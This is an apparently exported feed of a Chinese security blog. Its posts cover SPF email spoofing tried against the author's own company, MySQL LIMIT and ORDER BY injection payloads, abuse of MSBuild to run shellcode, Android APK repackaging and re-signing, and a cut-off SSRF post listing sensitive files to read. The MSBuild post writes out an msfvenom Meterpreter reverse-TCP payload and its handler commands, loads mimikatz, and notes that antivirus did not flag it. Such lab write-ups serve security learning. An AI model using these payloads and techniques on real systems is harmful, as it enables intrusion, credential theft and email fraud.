    <content type="html"><![CDATA[<h2 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h2><p>SPF通过校验发件端IP地址，防止邮件诈骗。</p><h2 id="SPF原理"><a href="#SPF原理" class="headerlink" title="SPF原理"></a>SPF原理</h2><p>SPF(Sender Policy Framework) 是一种以IP地址认证电子邮件发件人身份的技术，通过认证发件IP与发件域名中的声明进行匹配，从而防止别人伪造你来发邮件。</p><h2 id="SPF验证过程"><a href="#SPF验证过程" class="headerlink" title="SPF验证过程"></a>SPF验证过程</h2><ol><li>接收端获取发件端IP(发件端的连接IP，无法改变)</li><li>接收端查询发件域名(SMTP会话中，mail from指令中的用户域名部分)的TXT记录</li><li>根据发件端的SPF记录的规则进行匹配，按照声明的策略进行处理</li></ol><p>根据验证过程，我们来梳理一下其中2个点。</p><h3 id="mail-from"><a href="#mail-from" class="headerlink" title="mail from"></a>mail from</h3><p>首先要分清楚mail from和from的区别：<br>mail form：实际发件人，由[前缀@域名]组成<br>from：显示发件人，即我们平时查看邮件简略信息时显示的发件人<br>将腾讯邮箱中的一封邮件导出为eml文件，使用记事本查看可以看到如下信息，下图标注了mail from和from<br><img src="http://img.cdn.cuittk.cn/SPF%E9%82%AE%E4%BB%B6%E6%AC%BA%E8%AF%88-mail-from.png" alt=""><br>如果mail_from （实际发件人） 和 from （显示发件人） 不一致，则收到的邮件会显示 本邮件由&lt;实际发件人&gt;代发， 以提醒收件人两者的不同。所以，不看清发件人是谁是很容易被骗的。</p><h3 id="SPF记录语法"><a href="#SPF记录语法" class="headerlink" title="SPF记录语法"></a>SPF记录语法</h3><p>一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。</p><p>这些 mechanism 包括以下几类：</p><pre><code class="language-html">all | ip4 | ip6 | a | mx | ptr | exists | include</code></pre><p>每个 mechanism 可以有四种前缀：</p><pre><code class="language-html">&quot;+&quot;  Pass（通过）&quot;-&quot;  Fail（拒绝）&quot;~&quot;  Soft Fail（软拒绝）&quot;?&quot;  Neutral（中立）</code></pre><p>这里列举常见的几种：</p><h4 id="all"><a href="#all" class="headerlink" title="all"></a>all</h4><p>表示所有 IP，肯定会命中。因此通常把它放在 SPF 记录的结尾，表示处理剩下的所有情况。</p><pre><code class="language-html">&quot;v=spf1 -all&quot; 拒绝所有（表示这个域名不会发出邮件）&quot;v=spf1 +all&quot; 接受所有（域名所有者认为 SPF 是没有用的，或者根本不在乎它）&quot;v=spf1 +a +mx +a:example.com -all&quot; 即采用本域名的a记录的IP地址，本域名的mx记录的IP地址，以及example.com的a记录的IP地址，除此之外全部拒绝</code></pre><h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><p>格式为include:<domain>，表示引入<domain>域名下的 SPF 记录。注意，如果该域名下不存在 SPF 记录，则会导致一个PermError结果。</domain></domain></p><pre><code class="language-html">&quot;v=spf1 include:example.com -all&quot; 即采用和 example.com 完全一样的 SPF 记录，并拒绝其他所有</code></pre><h4 id="软拒绝"><a href="#软拒绝" class="headerlink" title="~软拒绝"></a>~软拒绝</h4><p>使用~all来配置时，一般会把-all拒绝的邮件当作垃圾邮件处理，但是人们有时还是回去翻垃圾邮件，由此也有可能导致邮件欺诈。</p><p>所以，在无特殊需求时，建议使用-all来处理。</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>在学习邮件欺诈漏洞的时候，我尝试对自己公司的邮箱下手，结果还真有，避免挨打，用company.com来代替实际的公司域名。</p><p>首先使用nslookup来查看公司邮箱的SPF记录：</p><pre><code class="language-html">nslookup -type=txt company.com</code></pre><p>发现使用的是~all配置，在上文提到，这是不安全的，所以我们有机会利用。</p><p>利用在线伪造邮件网站<a href="https://emkei.cz/?reCAPTCHAv2" target="_blank" rel="external">https://emkei.cz/?reCAPTCHAv2</a></p><pre><code class="language-html">From Name：即我们上文提到的mail fromFrom E-mail：我们想伪造的公司域名To：受害者邮箱Subject：邮件标题Text：邮件内容</code></pre><p>类似上面这样填好之后，就可以发送邮件到我的gmail邮箱，立刻就收到了！<br>And else<br>通过nslookup可以看到，我们公司使用是腾讯企业邮箱，配置的SPF记录是直接调用spf.mail.qq.com域名的SPF记录，再次去查看该域名的SPF记录，可以看到它又是调用了几个子域的SPF记录<br>挑第一个子域的SPF看一下，终于看到了具体的IP地址<br>如果你能拿下这些IP段中任一一台主机，就可以伪造腾讯邮箱进行邮件欺诈了，为所欲为，腾讯的SPF规则对你来说就是渣渣。<br>推荐阅读hackerOne披露的漏洞实例：<a href="https://hackerone.com/reports/629087" target="_blank" rel="external">https://hackerone.com/reports/629087</a><br>快速检查工具：<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="external">https://github.com/BishopFox/spoofcheck</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mntn0x.github.io/2019/08/02/邮件欺诈之SPF/" target="_blank" rel="external">https://mntn0x.github.io/2019/08/02/邮件欺诈之SPF/</a><br><a href="https://cloud.tencent.com/developer/article/1047273" target="_blank" rel="external">https://cloud.tencent.com/developer/article/1047273</a><br><a href="https://www.renfei.org/blog/introduction-to-spf.html" target="_blank" rel="external">https://www.renfei.org/blog/introduction-to-spf.html</a><br><a href="https://www.4hou.com/web/13931.html" target="_blank" rel="external">https://www.4hou.com/web/13931.html</a><br><a href="https://oddboy.cn/2019/反垃圾邮件技术及可能存在的问题-spf-dkim-dmarc/" target="_blank" rel="external">https://oddboy.cn/2019/反垃圾邮件技术及可能存在的问题-spf-dkim-dmarc/</a><br><a href="http://www.0xby.com/855.html" target="_blank" rel="external">http://www.0xby.com/855.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SPF&quot;&gt;&lt;a href=&quot;#SPF&quot; class=&quot;headerlink&quot; title=&quot;SPF&quot;&gt;&lt;/a&gt;SPF&lt;/h2&gt;&lt;p&gt;SPF通过校验发件端IP地址，防止邮件诈骗。&lt;/p&gt;
&lt;h2 id=&quot;SPF原理&quot;&gt;&lt;a href=&quot;#SPF原理&quot; class=&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>phpjiami 解密方法</title>
    <link href="https://blog.cuittk.cn/2020/02/02/phpjiami%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95/"/>
    <id>https://blog.cuittk.cn/2020/02/02/phpjiami解密方法/</id>
    <published>2020-02-02T10:34:06.239Z</published>
    <updated>2020-02-26T08:06:40.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpjiami-解密方法"><a href="#phpjiami-解密方法" class="headerlink" title="phpjiami 解密方法"></a>phpjiami 解密方法</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a><br>PHP解密：zym加密 带乱码调试过程 <a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-693641-1-1.html</a><br>解密混淆的PHP代码 <a href="https://zeroyu.xyz/2018/05/23/decode-garble-phpcode/" target="_blank" rel="external">https://zeroyu.xyz/2018/05/23/decode-garble-phpcode/</a><br>解密混淆的PHP程序 <a href="http://weaponx.site/2018/04/27/%E8%A7%A3%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84PHP%E7%A8%8B%E5%BA%8F/" target="_blank" rel="external">http://weaponx.site/2018/04/27/%E8%A7%A3%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84PHP%E7%A8%8B%E5%BA%8F/</a></p><p>phpjiami网站解密脚本 <a href="https://github.com/PikuYoake/phpjiami_decode" target="_blank" rel="external">https://github.com/PikuYoake/phpjiami_decode</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;phpjiami-解密方法&quot;&gt;&lt;a href=&quot;#phpjiami-解密方法&quot; class=&quot;headerlink&quot; title=&quot;phpjiami 解密方法&quot;&gt;&lt;/a&gt;phpjiami 解密方法&lt;/h2&gt;&lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; cla
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>mysql limit注入</title>
    <link href="https://blog.cuittk.cn/2020/01/10/mysql%20limit%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.cuittk.cn/2020/01/10/mysql limit注入/</id>
    <published>2020-01-10T03:52:16.390Z</published>
    <updated>2020-03-26T09:52:19.285Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql-limit注入证明"><a href="#mysql-limit注入证明" class="headerlink" title="mysql limit注入证明"></a>mysql limit注入证明</h2><h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><p>目前limit后注入的唯一方法是使用procedure analyse进行报错注入</p><pre><code class="language-html">limit=1 procedure analyse(1,extractvalue(rand(),concat(0x3a,version())));</code></pre><p><img src="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png" alt=""></p><h3 id="注入版本"><a href="#注入版本" class="headerlink" title="注入版本"></a>注入版本</h3><p>使用analyse()只能5.0.0&lt;mysql&lt;5.6.6的版本</p><h3 id="使用into，查字段数"><a href="#使用into，查字段数" class="headerlink" title="使用into，查字段数"></a>使用into，查字段数</h3><p>原字段数为3<br><img src="http://img.cdn.cuittk.cn/7a52vhqsxcuzbolq94wkywyoje.png" alt=""></p><pre><code class="language-html">select * from users order by id limit 0,4 into @</code></pre><p><img src="http://img.cdn.cuittk.cn/836igjxo71i0yzu784av8oada3.png" alt=""></p><pre><code class="language-html">select * from users order by id limit 0,4 into @,@,@</code></pre><p><img src="http://img.cdn.cuittk.cn/6eb0cytjyr8859vo75hztijbjf.png" alt=""><br>得到字段数为3</p><h1 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h1><p>真实版本：5.5.53<br><img src="http://img.cdn.cuittk.cn/bo52c9djgzr272sapgs6mybonu.png" alt=""></p><pre><code class="language-html">1/*!50551aaaa*/报错，说明版本号5.5.51并不大于真实版本</code></pre><p><img src="http://img.cdn.cuittk.cn/0cdsfvwudp4aeaqc5hq8tqog8p.png" alt=""></p><pre><code class="language-html">1/*!50553aaaa*/报错，说明版本号5.5.53并不大于真实版本</code></pre><p><img src="http://img.cdn.cuittk.cn/o1xb2guloackguyij2tk0qwqj8.png" alt=""></p><pre><code class="language-html">1/*!50554aaaa*/返回正常，说明版本号5.5.54&gt;真实版本</code></pre><p><img src="http://img.cdn.cuittk.cn/63mxlmq0zc0g4oa6frjmlhni2j.png" alt=""><br>得到版本号：5.5.53</p><h2 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h2><pre><code class="language-html">/?order=if(1=1,name,price)/?order=IF(1=1,name,price) 通过name字段排序/?order=IF(1=2,name,price) 通过price字段排序if(1=2,1,SLEEP(2))</code></pre><p>数据猜解</p><pre><code class="language-html">/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误</code></pre><p>猜解当前数据库的表名<br>猜解指定表名中的列名</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/piaomiaohongchen/p/10680088.html" target="_blank" rel="external">https://www.cnblogs.com/piaomiaohongchen/p/10680088.html</a><br><a href="http://www.vuln.cn/8101" target="_blank" rel="external">http://www.vuln.cn/8101</a><br><a href="http://www.2cto.com/Article/201206/134211.html" target="_blank" rel="external">http://www.2cto.com/Article/201206/134211.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mysql-limit注入证明&quot;&gt;&lt;a href=&quot;#mysql-limit注入证明&quot; class=&quot;headerlink&quot; title=&quot;mysql limit注入证明&quot;&gt;&lt;/a&gt;mysql limit注入证明&lt;/h2&gt;&lt;h3 id=&quot;注入方法&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows白加黑</title>
    <link href="https://blog.cuittk.cn/2019/12/19/Windows%E7%99%BD%E5%8A%A0%E9%BB%91/"/>
    <id>https://blog.cuittk.cn/2019/12/19/Windows白加黑/</id>
    <published>2019-12-19T06:47:19.318Z</published>
    <updated>2020-03-02T04:58:17.335Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Windows白加黑"><a href="#Windows白加黑" class="headerlink" title="Windows白加黑"></a>Windows白加黑</h2><p>攻击机：Kali Linux ：172.16.1.130<br>受害机：Win 7_64位：172.16.1.135</p><h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台<br>MSBuild可在未安装Visual Studio的环境中编译.net的工程文件<br>MSBuild可编译特定格式的xml文件<br>更多基本知识可参照以下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd393574.aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd393574.aspx</a></p><h4 id="扩展用法"><a href="#扩展用法" class="headerlink" title="扩展用法"></a>扩展用法</h4><p>在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码<br>详细介绍可参考如下链接：<br><a href="https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/dd722601.aspx?f=255&amp;MSPPError=-2147217396</a></p><h5 id="HelloWorld示例"><a href="#HelloWorld示例" class="headerlink" title="HelloWorld示例"></a>HelloWorld示例</h5><p>以下代码保存为helloworld:</p><pre><code class="language-html">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;  &lt;Target Name=&quot;Hello&quot;&gt;   &lt;HelloWorld /&gt;  &lt;/Target&gt;  &lt;UsingTask    TaskName=&quot;HelloWorld&quot;    TaskFactory=&quot;CodeTaskFactory&quot;    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;    &lt;ParameterGroup/&gt;    &lt;Task&gt;      &lt;Using Namespace=&quot;System&quot; /&gt;        &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;        &lt;![CDATA[                Console.WriteLine(&quot;Hello World&quot;);                ]]&gt;      &lt;/Code&gt;    &lt;/Task&gt;    &lt;/UsingTask&gt;&lt;/Project&gt;</code></pre><p>注：保存的文件名可以任意<br>cmd下执行：</p><pre><code class="language-html">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld</code></pre><p>cmd输出helloworld，如图：<br><img src="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png" alt=""></p><h5 id="执行powershell命令"><a href="#执行powershell命令" class="headerlink" title="执行powershell命令"></a>执行powershell命令</h5><p>可参照三好师傅分享的POC，地址如下：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a><br>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-1.png" alt=""><br>标记1TaskName可修改，但两个位置的名称需要对应<br>标记2为固定格式:<code>TaskFactory=&quot;CodeTaskFactory&quot;</code><br>标记3的路径在不同系统可能会有区别，准确的为：</p><pre><code class="language-html">$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll</code></pre><p>系统默认安装路径为:</p><pre><code class="language-html">C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</code></pre><p>标记4为一个简单的输出helloworld实例<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-2.png" alt=""><br>标记5为固定格式，定义为</p><pre><code class="language-html">public class ClassExample : Task, ITask</code></pre><p>下载executes%20PowerShellCommands.xml重命名为：c</p><pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c</code></pre><p>实际测试POC如图,成功执行powershell命令<br><img src="http://img.cdn.cuittk.cn/3-3.png" alt=""></p><h5 id="执行PE文件"><a href="#执行PE文件" class="headerlink" title="执行PE文件"></a>执行PE文件</h5><p>下载<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</a><br>重命名为：aa，本环境只能用64位的.net Framework加载</p><pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa</code></pre><p><img src="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png" alt=""></p><h5 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h5><p>下载32位shellcode，需要使用32位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a><br>重命名为dd</p><pre><code class="language-html">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe dd</code></pre><p><img src="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png" alt=""></p><p>下载64位shellcode，需要使用64位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>重命名为ee</p><pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ee</code></pre><p>64位的能执行shellcode，但是会报错。<br><img src="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png" alt=""></p><p>我们这里用64位的shellcode和64位的win7来操作。</p><pre><code class="language-html">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp</code></pre><p>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听</p><pre><code class="language-html">msfconsoleuse exploit/multi/handlerset PAYLOAD windows/x64/meterpreter/reverse_tcpset LHOST 192.168.118.134set LPORT 4444set ExitOnSession falseset autorunscript migrate -n explorer.exeexploit -j</code></pre><p>Meterprefer 使用</p><pre><code class="language-html">1. background 挂入后台session2. sessions 查看现有的后台  session3. sessions -i 1 查看后台session id为1</code></pre><p>成功反弹msf，可以执行命令<br><img src="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png" alt=""></p><p>某管家没有报毒<br><img src="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png" alt=""></p><h5 id="遇到的沙雕问题"><a href="#遇到的沙雕问题" class="headerlink" title="遇到的沙雕问题"></a>遇到的沙雕问题</h5><p>复制shellcode报错：</p><pre><code class="language-html">生成失败。“C:\test\ee_1”(默认目标) (1) -&gt;(Hello 目标) -&gt;  C:\test\ee_1(8,5): error : 此编译的源文件可以在以下位置找到:“C:\Users\test\AppData\Local\Temp\a10919e0-6aea-4146-85f5-4f5959c7a4b8.txt”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(65,57) : error CS0103: 当前上下文中不存在名称“shellcode”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,28) : error CS0103: 当前上下文中不存在名称“shellcode”C:\test\ee_1(8,5): error MSB3758: 编译时出错。c:\Users\test\AppData\Local\Temp\a41qxcmi.0.cs(67,62) : error CS0103: 当前上下文中不存在名称“shellcode” C:\test\ee_1(8,5): error MSB4036: 未找到“ClassExample”任务。请检查下列各项:1.) 项目文件中的任务名称与任务类的名称相同。2.) 任务类为“public”且实现 Microsoft.Build.Framework.ITask接口。3.) 在项目文件中或位于“C:\Windows\Microsoft.NET\Framework64\v4.0.30319目录的 *.tasks 文件中使用 &lt;UsingTask&gt; 正确声明了该任务。    0 个警告    5 个错误已用时间 00:00:00.31</code></pre><p>我直接复制的shellcode，是<code>byte[] buf = new byte[510] {</code>开头，<br>模板中是<code>byte[] shellcode = new byte[276] {</code>，太不仔细了。严格只覆盖等号后面的内容。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/</a><br><a href="https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91" target="_blank" rel="external">https://y4er.com/post/reverse-shell-bypass/#windows%E7%99%BD%E5%8A%A0%E9%BB%91</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Windows白加黑&quot;&gt;&lt;a href=&quot;#Windows白加黑&quot; class=&quot;headerlink&quot; title=&quot;Windows白加黑&quot;&gt;&lt;/a&gt;Windows白加黑&lt;/h2&gt;&lt;p&gt;攻击机：Kali Linux ：172.16.1.130&lt;br&gt;受害机：Wi
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>android渗透测试从0开始</title>
    <link href="https://blog.cuittk.cn/2019/12/13/android%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    <id>https://blog.cuittk.cn/2019/12/13/android渗透测试从0开始/</id>
    <published>2019-12-13T07:57:44.641Z</published>
    <updated>2020-02-26T08:12:17.362Z</updated>
    
    <content type="html"><![CDATA[<h2 id="android渗透测试从0开始"><a href="#android渗透测试从0开始" class="headerlink" title="android渗透测试从0开始"></a>android渗透测试从0开始</h2><h3 id="apktool安装与使用"><a href="#apktool安装与使用" class="headerlink" title="apktool安装与使用"></a>apktool安装与使用</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h4 id="apktool反编译"><a href="#apktool反编译" class="headerlink" title="apktool反编译"></a>apktool反编译</h4><p>反编译出代码到test文件夹</p><pre><code class="language-html">apktool d test.apk -o test</code></pre><p>反编译报错：</p><pre><code class="language-html">I: Using Apktool 2.4.1 on xxx.apkI: Loading resource table...I: Decoding AndroidManifest.xml with resources...I: Loading resource table from file: C:\Users\Administrator\AppData\Local\apktool\framework\1.apkI: Regular manifest package...I: Decoding file-resources...I: Decoding values */* XMLs...I: Baksmaling classes.dex...I: Baksmaling classes2.dex...I: Baksmaling assets/A3AEECD8.dex...Exception in thread &quot;main&quot; org.jf.dexlib2.dexbacked.DexBackedDexFile$NotADexFile: Not a valid dex magic value: cf 77 4c c7 9b 21 01 cd        at org.jf.dexlib2.util.DexUtil.verifyDexHeader(DexUtil.java:93)        at org.jf.dexlib2.dexbacked.DexBackedDexFile.getVersion(DexBackedDexFile.java:111)        at org.jf.dexlib2.dexbacked.DexBackedDexFile.&lt;init&gt;(DexBackedDexFile.java:78)        at org.jf.dexlib2.dexbacked.DexBackedDexFile.&lt;init&gt;(DexBackedDexFile.java:138)        at org.jf.dexlib2.dexbacked.ZipDexContainer$1.getDexFile(ZipDexContainer.java:181)        at brut.androlib.src.SmaliDecoder.decode(SmaliDecoder.java:90)        at brut.androlib.src.SmaliDecoder.decode(SmaliDecoder.java:39)        at brut.androlib.Androlib.decodeSourcesSmali(Androlib.java:96)        at brut.androlib.ApkDecoder.decode(ApkDecoder.java:164)        at brut.apktool.Main.cmdDecode(Main.java:170)        at brut.apktool.Main.main(Main.java:76)Press any key to continue . . .</code></pre><p>解决办法：<br>增加 <code>d --only-main-classe</code> 即可</p><pre><code class="language-html">apktool d --only-main-classe test.apk -o test</code></pre><h4 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h4><h4 id="apktool编译成apk"><a href="#apktool编译成apk" class="headerlink" title="apktool编译成apk"></a>apktool编译成apk</h4><pre><code class="language-html">apktool b test -o test2.apk</code></pre><h3 id="apk签名"><a href="#apk签名" class="headerlink" title="apk签名"></a>apk签名</h3><h4 id="去除签名"><a href="#去除签名" class="headerlink" title="去除签名"></a>去除签名</h4><p>其实很简单，用WinRAR打开apk，找到META-INF文件夹，删除MANIFEST.MF之外的所有其他文件即可。</p><h4 id="生成keystore文件"><a href="#生成keystore文件" class="headerlink" title="生成keystore文件"></a>生成keystore文件</h4><p>首先，签名需要keystore文件，可以使用keytool工具生成，一般Java环境都带有keytool命令。<br>要使用管理员权限运行cmd，不然会报错。</p><pre><code class="language-html">cd C:\Program Files\Java\jdk1.8.0_231\binkeytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</code></pre><p>各个参数解释如下：</p><pre><code class="language-html">-genkey 产生证书文件-alias 产生别名-keystore 指定密钥库的.keystore文件中-keyalg 指定密钥的算法,这里指定为RSA(非对称密钥算法)-validity 为证书有效天数，这里我们写的是40000天</code></pre><p><img src="http://img.cdn.cuittk.cn/0zi1vb1uxynidx1vmi7estznnr.png" alt=""></p><h4 id="jarsigner签名apk"><a href="#jarsigner签名apk" class="headerlink" title="jarsigner签名apk"></a>jarsigner签名apk</h4><p>jarsigner也存在于Java JDK的安装包当中，所以安装好了Java环境的话，可以直接在命令行使用。</p><pre><code class="language-html">jarsigner -verbose -keystore demo.keystore demo.apk demo.keystore</code></pre><pre><code class="language-html">-verbose 指定生成详细输出-keystore 指定数字证书存储路径</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="external">apktool安装</a><br><a href="https://haozi.moe/2019/12/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8A%93%E5%8C%85%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">apktool反编译报错</a><br><a href="https://blog.csdn.net/s13383754499/article/details/84108475" target="_blank" rel="external">apk去掉签名</a><br><a href="https://blog.csdn.net/sxk874890728/article/details/80486223" target="_blank" rel="external">一步一步带你反编译apk，并教你修改smali和重新打包</a><br><a href="https://blog.csdn.net/dreamer2020/article/details/52761606" target="_blank" rel="external">apk签名教程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;android渗透测试从0开始&quot;&gt;&lt;a href=&quot;#android渗透测试从0开始&quot; class=&quot;headerlink&quot; title=&quot;android渗透测试从0开始&quot;&gt;&lt;/a&gt;android渗透测试从0开始&lt;/h2&gt;&lt;h3 id=&quot;apktool安装与使用&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ssrf之深度利用</title>
    <link href="https://blog.cuittk.cn/2019/12/07/ssrf%E4%B9%8B%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8/"/>
    <id>https://blog.cuittk.cn/2019/12/07/ssrf之深度利用/</id>
    <published>2019-12-07T04:45:00.428Z</published>
    <updated>2020-03-25T13:42:31.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ssrf之深度利用"><a href="#ssrf之深度利用" class="headerlink" title="ssrf之深度利用"></a>ssrf之深度利用</h2><h3 id="file协议任意文件读取的深度利用"><a href="#file协议任意文件读取的深度利用" class="headerlink" title="file协议任意文件读取的深度利用"></a>file协议任意文件读取的深度利用</h3><h4 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h4><p>linux:</p><pre><code class="language-html">/proc/version/etc/issue/etc/redhat-release/proc/cpuinfo</code></pre><p>windows:</p><pre><code class="language-html">C:\windows\win.ini</code></pre><h4 id="查看网络环境"><a href="#查看网络环境" class="headerlink" title="查看网络环境"></a>查看网络环境</h4><pre><code class="language-html">/etc/hosts/etc/sysconfig/network-scripts/ifcfg-eth0/proc/net/arp #Arp缓存信息，可用于枚举局域网存活主机</code></pre><h4 id="找绝对路径"><a href="#找绝对路径" class="headerlink" title="找绝对路径"></a>找绝对路径</h4><pre><code class="language-html">/proc/self/cmdline        #查看当前进程路径信息/proc/sched_debug        #提供cpu上正在运行的进程信息，可以获得进程的pid号/proc/[PID]/cmdline        #获取路径信息</code></pre><h4 id="ssh秘钥信息"><a href="#ssh秘钥信息" class="headerlink" title="ssh秘钥信息"></a>ssh秘钥信息</h4><pre><code class="language-html">/root/.ssh/下的公钥和私钥/root/.ssh/authorized_keys    #免密钥连接</code></pre><h4 id="针对centos-6-5"><a href="#针对centos-6-5" class="headerlink" title="针对centos 6.5"></a>针对centos 6.5</h4><h5 id="查看web服务的配置信息"><a href="#查看web服务的配置信息" class="headerlink" title="查看web服务的配置信息"></a>查看web服务的配置信息</h5><pre><code 